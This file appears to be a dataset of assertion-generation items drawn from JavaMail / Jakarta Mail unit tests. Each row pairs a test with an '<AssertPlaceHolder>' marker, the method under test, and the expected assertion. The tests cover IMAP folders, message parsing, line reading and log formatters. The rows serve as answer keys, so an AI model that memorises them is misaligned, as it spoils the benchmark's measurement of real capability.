getUIDNotSticky() throws MessagingException { checkOpened(); return uidNotSticky; }"	assertFalse(((IMAPFolder) test).getUIDNotSticky())
"testUidNotStickyTrue() { testWithHandler( new IMAPTest() { @Override public void test(Store store, IMAPHandler handler) throws MessagingException, IOException { Folder test = store.getFolder(""test""); try { test.open(Folder.READ_WRITE); ""<AssertPlaceHolder>""; } finally { test.close(); } } }, new IMAPHandler() { @Override public void select(String line) throws IOException { untagged(""NO [UIDNOTSTICKY]""); super.select(line); } }); }
getUIDNotSticky() throws MessagingException { checkOpened(); return uidNotSticky; }"	assertTrue(((IMAPFolder) test).getUIDNotSticky())
"testSizeSmall() { testWithHandler( new IMAPTest() { @Override public void test(Folder folder, IMAPHandlerMessage handler) throws MessagingException { Message m = folder.getMessage(1); ""<AssertPlaceHolder>""; } }, new IMAPHandlerMessage() { { { size = 123; } } }); }
getSize() throws MessagingException { checkExpunged(); // if bodyLoaded, size is already set if (size == -1) loadEnvelope();    // XXX - could just fetch the size if (size > Integer.MAX_VALUE) return Integer.MAX_VALUE;    // the best we can do... else return (int) size; }"	assertEquals(123, m.getSize())
"testAttachementFileName() { testWithHandler( new IMAPTest() { @Override public void test(Folder folder, IMAPHandlerMessage handler) throws MessagingException, IOException { Message m = folder.getMessage(1); Multipart mp = (Multipart) m.getContent(); BodyPart bp = mp.getBodyPart(1); ""<AssertPlaceHolder>""; } }, new IMAPHandlerMessage() { @Override public void fetch(String line) throws IOException { untagged(""1 FETCH (BODYSTRUCTURE ("" + ""(""text"" ""html"" (""charset"" ""utf-8"") NIL NIL ""base64"" 402 6 NIL NIL NIL NIL)"" + ""(""application"" ""octet-stream"" (""name"" ""=?utf-8?B?ZmlsZW5hbWU=?= =?utf-8?B?LmNzdg==?="") NIL NIL ""base64"" 658 NIL "" + ""(""attachment"" (""filename"" """")) NIL NIL) ""mixed"" "" + ""(""boundary"" ""--boundary_539_27806e16-2599-4612-b98a-69335bedd206"") NIL NIL NIL))"" ); ok(); } } ); }
getFileName() throws MessagingException { checkExpunged(); if (bodyLoaded) return super.getFileName();  String filename = null; loadBODYSTRUCTURE();  if (bs.dParams != null) filename = bs.dParams.get(""filename""); if (filename == null && bs.cParams != null) filename = bs.cParams.get(""name""); return filename; }"	"assertEquals(""filename.csv"", MimeUtility.decodeText(bp.getFileName()))"
"testUtf8SubjectEncoded() { String s = null; try { s = MimeUtility.decodeText(ENV_UTF8_ENCODED_SUBJECT); } catch (UnsupportedEncodingException ex) { } final String subject = s;  testWithHandler( new IMAPTest() { @Override public void test(Folder folder, IMAPHandlerMessage handler) throws MessagingException { Message m = folder.getMessage(1); ""<AssertPlaceHolder>""; } }, new IMAPHandlerMessage() { { { envelope = ""("" + ENV_DATE + "" """" + ENV_UTF8_ENCODED_SUBJECT + """" "" + ENV_ADDRS + "")""; } } }); }
getSubject() throws MessagingException { checkExpunged(); if (bodyLoaded) return super.getSubject();  if (subject != null) // already cached ? return subject;  loadEnvelope(); if (envelope.subject == null) // no subject return null;  // Cache and return the decoded value. try { // The server *should* unfold the value, but just in case it // doesn't we unfold it here. subject = MimeUtility.decodeText(MimeUtility.unfold(envelope.subject)); } catch (UnsupportedEncodingException ex) { subject = envelope.subject; }  return subject; }"	assertEquals(subject, m.getSubject())
"testUtf8Subject() { String s = null; try { s = MimeUtility.decodeText(ENV_UTF8_ENCODED_SUBJECT); } catch (UnsupportedEncodingException ex) { } final String subject = s;  testWithHandler( new IMAPTest() { @Override public void test(Folder folder, IMAPHandlerMessage handler) throws MessagingException { Message m = folder.getMessage(1); ""<AssertPlaceHolder>""; } }, new IMAPHandlerMessage() { { { envelope = ""("" + ENV_DATE + "" """" + subject + """" "" + ENV_ADDRS + "")""; capabilities += "" ENABLE UTF8=ACCEPT""; } }  @Override public void enable(String line) throws IOException { ok(); } }); }
getSubject() throws MessagingException { checkExpunged(); if (bodyLoaded) return super.getSubject();  if (subject != null) // already cached ? return subject;  loadEnvelope(); if (envelope.subject == null) // no subject return null;  // Cache and return the decoded value. try { // The server *should* unfold the value, but just in case it // doesn't we unfold it here. subject = MimeUtility.decodeText(MimeUtility.unfold(envelope.subject)); } catch (UnsupportedEncodingException ex) { subject = envelope.subject; }  return subject; }"	assertEquals(subject, m.getSubject())
"testUtf7Namespaces() { testWithHandler( new IMAPTest() { @Override public void test(Store store, TestServer server) throws MessagingException, IOException { store.connect(""test"", ""test""); Folder[] pub = ((IMAPStore) store).getSharedNamespaces(); ""<AssertPlaceHolder>""; } }, new IMAPHandler() { { { capabilities += "" NAMESPACE""; } }  @Override public void namespace() throws IOException { untagged(""NAMESPACE (("""" ""/"")) ((""~"" ""/"")) "" + ""(("""" + utf7Folder + ""/"" ""/""))""); ok(); } }); }
getSharedNamespaces() throws MessagingException { Namespaces ns = getNamespaces(); if (ns == null || ns.shared == null) return super.getSharedNamespaces(); return namespaceToFolders(ns.shared, null); }"	assertEquals(utf8Folder, pub[0].getName())
"testCloseEmptiesPool() { testWithHandler( new IMAPTest() { @Override public void init(Properties props) { props.setProperty(""mail.imap.connectionpoolsize"", ""2""); }  @Override public void test(Store store, TestServer server) throws MessagingException, IOException { store.connect(""test"", ""test""); Folder test = store.getFolder(""INBOX""); test.open(Folder.READ_ONLY); Folder test2 = store.getFolder(""INBOX""); test2.open(Folder.READ_ONLY); test.close(false); test2.close(false); store.close(); ""<AssertPlaceHolder>""; server.waitForClients(2); // test will timeout if clients don't terminate } }, new IMAPHandler() { }); }
close() throws MessagingException { cleanup(); // do these again in case cleanup returned early // because we were already closed due to a failure, // in which case we force close everything closeAllFolders(true); emptyConnectionPool(true); }"	assertEquals(2, server.clientCount())
"Exception { // test a range of values to find boundary condition errors for (int n = 1; n <= 100; n++) { //System.out.println(""MessageCache.testExpungeAdd: test "" + n); // start with one message MessageCache mc = new MessageCache(1, false); // add the remaining messages (eat into SLOP) mc.addMessages(n - 1, 2); // now expunge a message to cause the seqnums array to be created mc.expungeMessage(1); // and add one more message mc.addMessages(1, n); //System.out.println(""  new seqnum "" + mc.seqnumOf(n + 1)); // does the new message have the expected sequence number? ""<AssertPlaceHolder>""; } }
seqnumOf(int msgnum) { if (seqnums == null) return msgnum; else { if (logger.isLoggable(Level.FINE)) logger.fine(""msgnum "" + msgnum + "" is seqnum "" + seqnums[msgnum - 1]); return seqnums[msgnum - 1]; } }"	assertEquals(mc.seqnumOf(n + 1), n)
"Exception { // test a range of values to find boundary condition errors for (int n = 2; n <= 100; n++) { //System.out.println(""MessageCache.testExpungeAdd: test "" + n); // start with two messages MessageCache mc = new MessageCache(2, false); // now expunge a message to cause the seqnums array to be created mc.expungeMessage(1); // add the remaining messages (eat into SLOP) mc.addMessages(n - 1, 2); //System.out.println(""  new seqnum "" + mc.seqnumOf(n + 1)); // does the new message have the expected sequence number? ""<AssertPlaceHolder>""; } }
seqnumOf(int msgnum) { if (seqnums == null) return msgnum; else { if (logger.isLoggable(Level.FINE)) logger.fine(""msgnum "" + msgnum + "" is seqnum "" + seqnums[msgnum - 1]); return seqnums[msgnum - 1]; } }"	assertEquals(mc.seqnumOf(n + 1), n)
"IOException { LineInputStream is = new LineInputStream(new ByteArrayInputStream( ""a\u00A9b\n"".getBytes(StandardCharsets.UTF_8)), true); ""<AssertPlaceHolder>""; }
readLine() throws IOException { //InputStream in = this.in; byte[] buf = lineBuffer;  if (buf == null) buf = lineBuffer = new byte[128];  int c1; int room = buf.length; int offset = 0;  while ((c1 = in.read()) != -1) { if (c1 == '\n') // Got NL, outa here. break; else if (c1 == '\r') { // Got CR, is the next char NL ? boolean twoCRs = false; if (in.markSupported()) in.mark(2); int c2 = in.read(); if (c2 == '\r') {        // discard extraneous CR twoCRs = true; c2 = in.read(); } if (c2 != '\n') { /* * If the stream supports it (which we hope will always * be the case), reset to after the first CR.  Otherwise, * we wrap a PushbackInputStream around the stream so we * can unread the characters we don't need.  The only * problem with that is that the caller might stop * reading from this LineInputStream, throw it away, * and then start reading from the underlying stream. * If that happens, the pushed back characters will be * lost forever. */ if (in.markSupported()) in.reset(); else { if (!(in instanceof PushbackInputStream)) in /*= this.in*/ = new PushbackInputStream(in, 2); if (c2 != -1) ((PushbackInputStream) in).unread(c2); if (twoCRs) ((PushbackInputStream) in).unread('\r'); } } break; // outa here. }  // Not CR, NL or CR-NL ... // .. Insert the byte into our byte buffer if (--room < 0) { // No room, need to grow. if (buf.length < MAX_INCR) buf = new byte[buf.length * 2]; else buf = new byte[buf.length + MAX_INCR]; room = buf.length - offset - 1; System.arraycopy(lineBuffer, 0, buf, 0, offset); lineBuffer = buf; } buf[offset++] = (byte) c1; }  if ((c1 == -1) && (offset == 0)) return null;  if (allowutf8) return new String(buf, 0, offset, StandardCharsets.UTF_8); else { if (defaultutf8) { // try to decode it as UTF-8 try { return decoder.decode(ByteBuffer.wrap(buf, 0, offset)). toString(); } catch (CharacterCodingException cex) { // looks like it's not valid UTF-8 data, // fall through and treat it as an 8-bit charset } } return new String(buf, 0, 0, offset); } }"	"assertEquals(""a\u00A9b"", is.readLine())"
"IOException { LineInputStream is = createStream(""a\251b\n"", StandardCharsets.ISO_8859_1); ""<AssertPlaceHolder>""; }
readLine() throws IOException { //InputStream in = this.in; byte[] buf = lineBuffer;  if (buf == null) buf = lineBuffer = new byte[128];  int c1; int room = buf.length; int offset = 0;  while ((c1 = in.read()) != -1) { if (c1 == '\n') // Got NL, outa here. break; else if (c1 == '\r') { // Got CR, is the next char NL ? boolean twoCRs = false; if (in.markSupported()) in.mark(2); int c2 = in.read(); if (c2 == '\r') {        // discard extraneous CR twoCRs = true; c2 = in.read(); } if (c2 != '\n') { /* * If the stream supports it (which we hope will always * be the case), reset to after the first CR.  Otherwise, * we wrap a PushbackInputStream around the stream so we * can unread the characters we don't need.  The only * problem with that is that the caller might stop * reading from this LineInputStream, throw it away, * and then start reading from the underlying stream. * If that happens, the pushed back characters will be * lost forever. */ if (in.markSupported()) in.reset(); else { if (!(in instanceof PushbackInputStream)) in /*= this.in*/ = new PushbackInputStream(in, 2); if (c2 != -1) ((PushbackInputStream) in).unread(c2); if (twoCRs) ((PushbackInputStream) in).unread('\r'); } } break; // outa here. }  // Not CR, NL or CR-NL ... // .. Insert the byte into our byte buffer if (--room < 0) { // No room, need to grow. if (buf.length < MAX_INCR) buf = new byte[buf.length * 2]; else buf = new byte[buf.length + MAX_INCR]; room = buf.length - offset - 1; System.arraycopy(lineBuffer, 0, buf, 0, offset); lineBuffer = buf; } buf[offset++] = (byte) c1; }  if ((c1 == -1) && (offset == 0)) return null;  if (allowutf8) return new String(buf, 0, offset, StandardCharsets.UTF_8); else { if (defaultutf8) { // try to decode it as UTF-8 try { return decoder.decode(ByteBuffer.wrap(buf, 0, offset)). toString(); } catch (CharacterCodingException cex) { // looks like it's not valid UTF-8 data, // fall through and treat it as an 8-bit charset } } return new String(buf, 0, 0, offset); } }"	"assertEquals(""a\251b"", is.readLine())"
"testScheduledExecutorWriteTimeout() { final String executorPropertyName = ""test""; ScheduledExecutorService ses = new ScheduledThreadPoolExecutor(1); try { Properties props = new Properties(); props.put(executorPropertyName, ses); ""<AssertPlaceHolder>""; } finally { ses.shutdownNow(); } }
getScheduledExecutorServiceProperty(Properties props, String name) { return getScheduledExecutorService(getProp(props, name)); }"	assertEquals(ses, PropUtil.getScheduledExecutorServiceProperty(props, executorPropertyName))
"testScheduledExecutorWriteTimeoutIsNull() { final String executorPropertyName = ""test""; Properties props = new Properties();  ""<AssertPlaceHolder>""; }
getScheduledExecutorServiceProperty(Properties props, String name) { return getScheduledExecutorService(getProp(props, name)); }"	assertEquals(null, PropUtil.getScheduledExecutorServiceProperty(props, executorPropertyName))
"Exception { ByteArrayOutputStream bos = new ByteArrayOutputStream(); QPEncoderStream qs = new QPEncoderStream(bos); qs.write(""test "".getBytes(StandardCharsets.US_ASCII)); qs.flush(); String result = new String(bos.toByteArray(), StandardCharsets.US_ASCII); ""<AssertPlaceHolder>""; }
flush() throws IOException { if (gotSpace) { output(' ', true); gotSpace = false; } out.flush(); }"	"assertEquals(""test=20"", result)"
"Exception { Set<String> socketMethods = new HashSet<>(); Method[] m = java.net.Socket.class.getDeclaredMethods(); String className = java.net.Socket.class.getName() + "".""; for (int i = 0; i < m.length; i++) { if (Modifier.isPublic(m[i].getModifiers()) && !Modifier.isStatic(m[i].getModifiers())) { String name = m[i].toString(). replace(""synchronized "", """"). replace(className, """"); socketMethods.add(name); } } Set<String> wtsocketMethods = new HashSet<>(); m = WriteTimeoutSocket.class.getDeclaredMethods(); className = WriteTimeoutSocket.class.getName() + "".""; for (int i = 0; i < m.length; i++) { if (Modifier.isPublic(m[i].getModifiers())) { String name = m[i].toString(). replace(""synchronized "", """"). replace(className, """"); socketMethods.remove(name); } } for (String s : socketMethods) System.out.println(""WriteTimeoutSocket did not override: "" + s); ""<AssertPlaceHolder>""; }
toString() { return socket.toString(); }"	assertTrue(socketMethods.isEmpty())
"testFormatNoRecords() { XMLFormatter xml = new XMLFormatter(); CollectorFormatter f = new CollectorFormatter((String) null, xml, (Comparator<LogRecord>) null);  String result = f.getTail((Handler) null); String expect = f.finish(xml.getHead((Handler) null)) + f.finish(xml.getTail((Handler) null)) + '\n'; ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertEquals(result, expect)
"testFormatMinDateTime() { String msg = ""message""; CollectorFormatter f = new CollectorFormatter(""{7,date,short} {7,time}"", (Formatter) null, (Comparator<LogRecord>) null);  long min = 100L;  LogRecord r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 1000L); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 2000L); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 3000L); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 4000L); f.format(r);  String result = f.getTail((Handler) null);  //MessageFormat allows Number or Date instances as date and time. //Top level MessageFormat doc show that implementaiton is DateFormat //See DateFormat::format(Object,StringBuffer,FieldPosition) //This must format as Number to match CollectorFormatter. ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	"assertEquals(result, MessageFormat.format(""{0,date,short} {0,time}"", min))"
"testFormatMaxDateTime() { String msg = ""message""; CollectorFormatter f = new CollectorFormatter(""{8,date,short} {8,time}"", (Formatter) null, (Comparator<LogRecord>) null);  long min = 100L; long high = 4000L;  LogRecord r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 1000L); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + high); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 2000L); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min); f.format(r);  r = new LogRecord(Level.SEVERE, msg); setEpochMilli(r, min + 3000L); f.format(r);  String result = f.getTail((Handler) null);  //MessageFormat allows Number or Date instances as date and time. //Top level MessageFormat doc show that implementaiton is DateFormat //See DateFormat::format(Object,StringBuffer,FieldPosition) //This must format as Number to match CollectorFormatter. ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	"assertEquals(result, MessageFormat.format(""{0,date,short} {0,time}"", min + high))"
"testGetTailExample1() { String p = ""{0}{1}{2}{4,choice,-1#|0#|0<... {4,number,integer} more}\n""; CollectorFormatter cf = new CollectorFormatter(p); LogRecord r = new LogRecord(Level.WARNING, ""warning message""); cf.format(r);  r = new LogRecord(Level.SEVERE, ""Encoding failed.""); RuntimeException npe = new NullPointerException(); StackTraceElement frame = new StackTraceElement(""java.lang.String"", ""getBytes"", ""String.java"", 913); npe.setStackTrace(new StackTraceElement[]{frame}); r.setThrown(npe); cf.format(r);  cf.format(new LogRecord(Level.INFO, ""info"")); cf.format(new LogRecord(Level.INFO, ""info"")); String output = cf.getTail((Handler) null); ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertNotNull(output)
"testGetTailExample3a() { String p = ""These {3} messages occurred between\n"" + ""{7,date,EEE, MMM dd HH:mm:ss:S ZZZ yyyy}"" + "" and {8,time,EEE, MMM dd HH:mm:ss:S ZZZ yyyy}\n""; CollectorFormatter cf = new CollectorFormatter(p); LogRecord min = new LogRecord(Level.SEVERE, """"); setEpochMilli(min, 1248203502449L); cf.format(min);  for (int i = 0; i < 71; ++i) { LogRecord mid = new LogRecord(Level.SEVERE, """"); setEpochMilli(mid, min.getMillis()); cf.format(mid); }  LogRecord max = new LogRecord(Level.SEVERE, """"); setEpochMilli(max, min.getMillis() + 110500); cf.format(max);  String output = cf.getTail((Handler) null); ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertNotNull(output)
"testGetTailExample3b() { String p = ""These {3} messages occurred between "" + ""{9,choice,86400000#{7,date} {7,time} and {8,time}"" + ""|86400000<{7,date} and {8,date}}\n""; CollectorFormatter cf = new CollectorFormatter(p); LogRecord min = new LogRecord(Level.SEVERE, """"); setEpochMilli(min, 1248203502449L);  cf.format(min); for (int i = 0; i < 114; ++i) { LogRecord mid = new LogRecord(Level.SEVERE, """"); setEpochMilli(mid, min.getMillis()); cf.format(mid); }  LogRecord max = new LogRecord(Level.SEVERE, """"); setEpochMilli(max, min.getMillis() + 2591000000L); cf.format(max);  String output = cf.getTail((Handler) null); ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertNotNull(output)
"testNewFormatterWithString() { CollectorFormatter f = new CollectorFormatter(""{3}""); f.format(new LogRecord(Level.SEVERE, """")); String result = f.getTail((Handler) null); ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	"assertEquals(result, ""1"")"
"testApplyWithoutComparator() { CollectorFormatter f = new CollectorFormatter(""{3}"", (Formatter) null, (Comparator<LogRecord>) null); LogRecord first = new LogRecord(Level.SEVERE, """"); LogRecord second = new LogRecord(Level.WARNING, """"); ""<AssertPlaceHolder>""; }
apply(final LogRecord t, final LogRecord u) { if (t == null || u == null) { throw new NullPointerException(); }  Comparator<? super LogRecord> c = getComparator0(); if (c != null) { return c.compare(t, u) >= 0 ? t : u; } else { return u; } }"	assertSame(second, f.apply(first, second))
"testApplyWithComparator() { CollectorFormatter f = new CollectorFormatter(""{3}"", (Formatter) null, SeverityComparator.getInstance()); LogRecord first = new LogRecord(Level.SEVERE, """"); LogRecord second = new LogRecord(Level.WARNING, """"); ""<AssertPlaceHolder>""; }
apply(final LogRecord t, final LogRecord u) { if (t == null || u == null) { throw new NullPointerException(); }  Comparator<? super LogRecord> c = getComparator0(); if (c != null) { return c.compare(t, u) >= 0 ? t : u; } else { return u; } }"	assertSame(first, f.apply(first, second))
"Exception { final String p = CollectorFormatter.class.getName(); Properties props = new Properties(); props.put(p.concat("".comparator""), SeverityComparator.class.getName()); props.put(p.concat("".comparator.reverse""), ""false""); LogManager manager = LogManager.getLogManager(); try { read(manager, props); CollectorFormatter cf = new CollectorFormatter(); LogRecord first = new LogRecord(Level.SEVERE, Level.SEVERE.getName()); LogRecord second = new LogRecord(Level.WARNING, Level.WARNING.getName()); cf.format(second); cf.format(first); String result = cf.getTail((Handler) null); ""<AssertPlaceHolder>""; } finally { manager.reset(); } }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertTrue(result, result.startsWith(Level.SEVERE.getName()))
"Exception { final String p = CollectorFormatter.class.getName(); Properties props = new Properties(); props.put(p.concat("".comparator""), SeverityComparator.class.getName()); props.put(p.concat("".comparator.reverse""), ""true""); LogManager manager = LogManager.getLogManager(); try { read(manager, props); CollectorFormatter cf = new CollectorFormatter(); LogRecord first = new LogRecord(Level.SEVERE, Level.SEVERE.getName()); LogRecord second = new LogRecord(Level.WARNING, Level.WARNING.getName()); cf.format(second); cf.format(first); String result = cf.getTail((Handler) null); ""<AssertPlaceHolder>""; } finally { manager.reset(); } }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertTrue(result, result.startsWith(Level.WARNING.getName()))
"Exception { final String p = CollectorFormatter.class.getName(); Properties props = new Properties(); props.put(p.concat("".comparator""), ""null""); LogManager manager = LogManager.getLogManager(); try { read(manager, props); CollectorFormatter cf = new CollectorFormatter(); LogRecord first = new LogRecord(Level.SEVERE, Level.SEVERE.getName()); LogRecord second = new LogRecord(Level.WARNING, Level.WARNING.getName()); cf.format(second); cf.format(first); String result = cf.getTail((Handler) null); ""<AssertPlaceHolder>""; } finally { manager.reset(); } }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertTrue(result, result.startsWith(Level.SEVERE.getName()))
"Exception { CollectorFormatter f = new CollectorFormatter(""{9}"", (Formatter) null, (Comparator<LogRecord>) null); LogRecord r = new LogRecord(Level.SEVERE, """"); setEpochMilli(r, 25L); f.format(r);  r = new LogRecord(Level.SEVERE, """"); setEpochMilli(r, 100L); f.format(r);  String init = f.getTail((Handler) null); Number n = NumberFormat.getIntegerInstance().parse(init); ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertEquals(75, n.longValue())
"Exception { CollectorFormatter f = new CollectorFormatter(""{10}"", (Formatter) null, (Comparator<LogRecord>) null);  String init = f.getTail((Handler) null); NumberFormat.getIntegerInstance().parse(init); tickMilli();  ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertTrue(init.equals(f.getTail((Handler) null)))
"Exception { CollectorFormatter f = new CollectorFormatter(""{11}"", (Formatter) null, (Comparator<LogRecord>) null);  String now = f.getTail((Handler) null); NumberFormat.getIntegerInstance().parse(now); tickMilli();  ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertFalse(now.equals(f.getTail((Handler) null)))
"Exception { CollectorFormatter f = new CollectorFormatter(""{12}"", (Formatter) null, (Comparator<LogRecord>) null);  String up = f.getTail((Handler) null); NumberFormat.getIntegerInstance().parse(up); tickMilli();  ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertFalse(up.equals(f.getTail((Handler) null)))
"testFormatNullFormatter() { CollectorFormatter f = new CollectorFormatter(""{1}"", (Formatter) null, (Comparator<LogRecord>) null); LogRecord r = new LogRecord(Level.SEVERE, ""message {0}""); r.setParameters(new Object[]{1}); f.format(r); String output = f.getTail((Handler) null); ""<AssertPlaceHolder>""; }
getTail(final Handler h) { super.getTail(h);  //Be forward compatible with super.getHead. return formatRecord(h, true); }"	assertEquals(f.formatMessage(r), output)
"Exception { final String p = CompactFormatter.class.getName(); Properties props = new Properties(); props.put(p.concat("".format""), ""%9$s""); LogManager manager = LogManager.getLogManager(); try { read(manager, props); CompactFormatter cf = new CompactFormatter(); LogRecord first = new LogRecord(Level.SEVERE, Level.INFO.getName()); first.setSequenceNumber(Short.MAX_VALUE); String result = cf.format(first); ""<AssertPlaceHolder>""; } finally { manager.reset(); } }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertEquals(String.valueOf((int) Short.MAX_VALUE), result)
"testNewFormatterNullPattern() { CompactFormatter cf = new CompactFormatter((String) null); LogRecord r = new LogRecord(Level.SEVERE, ""message""); String result = cf.format(r); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertTrue(result, result.contains(r.getMessage()))
"testFormatWithMessagePrecisionOverWidth() { LogRecord record = new LogRecord(Level.SEVERE, ""message""); record.setThrown(new Throwable(""thrown"")); CompactFormatter cf = new CompactFormatter(""%7$#6.12s""); String result = cf.format(record); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	"assertEquals(""mes|Throwable"", result)"
"testFormatWithMessageWidthOverPrecision() { LogRecord record = new LogRecord(Level.SEVERE, ""message""); record.setThrown(new Throwable(""thrown"")); CompactFormatter cf = new CompactFormatter(""%7$#12.6s""); String result = cf.format(record); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	"assertEquals(""mes\u0020\u0020\u0020|Thr\u0020\u0020\u0020"", result)"
"testFormatWithMessageEmpty() { LogRecord record = new LogRecord(Level.SEVERE, """"); CompactFormatter cf = new CompactFormatter(); String result = cf.format(record); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertEquals(LINE_SEP, result)
"testFormatMessageZeroWidth() { LogRecord record = new LogRecord(Level.SEVERE, ""message""); record.setThrown(new Throwable(""thrown"")); CompactFormatter cf = new CompactFormatter(""%7$#0s%n""); ""<AssertPlaceHolder>""; //Zero width is not allowed //java.util.FormatFlagsConversionMismatchException: //Conversion = s, Flags = 0 }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertNotNull(cf.format(record))
"testFormatMessageZeroPrecision() { LogRecord record = new LogRecord(Level.SEVERE, ""message""); record.setThrown(new Throwable(""thrown"")); CompactFormatter cf = new CompactFormatter(""%7$#.0s%n""); String result = cf.format(record); ""<AssertPlaceHolder>""; }
format(final LogRecord record) { //LogRecord is mutable so define local vars. Locale l = getLocale(record); String msg = formatMessage(record); String thrown = formatThrown(record); String err = formatError(record); Object[] params = { formatZonedDateTime(record), formatSource(record), formatLoggerName(record), formatLevel(record), msg, thrown, new Alternate(msg, thrown), new Alternate(thrown, msg), record.getSequenceNumber(), formatThreadID(record), err, new Alternate(msg, err), new Alternate(err, msg), formatBackTrace(record), record.getResourceBundleName(), record.getMessage()};  if (l == null) { //BUG ID 6282094 return String.format(fmt, params); } else { return String.format(l, fmt, params); } }"	assertEquals(LINE_SEP, result)
"testFormatMessageNullRecordMessagePrecision() { LogRecord record = new LogRecord(Level.SEVERE, (String) null); record.setThrown(new Throwable(""thrown"")); CompactFormatter cf = new CompactFormatter(""%7$#.0s%n""); String result = cf.format(record); ""<AssertPlaceHolder>""; }
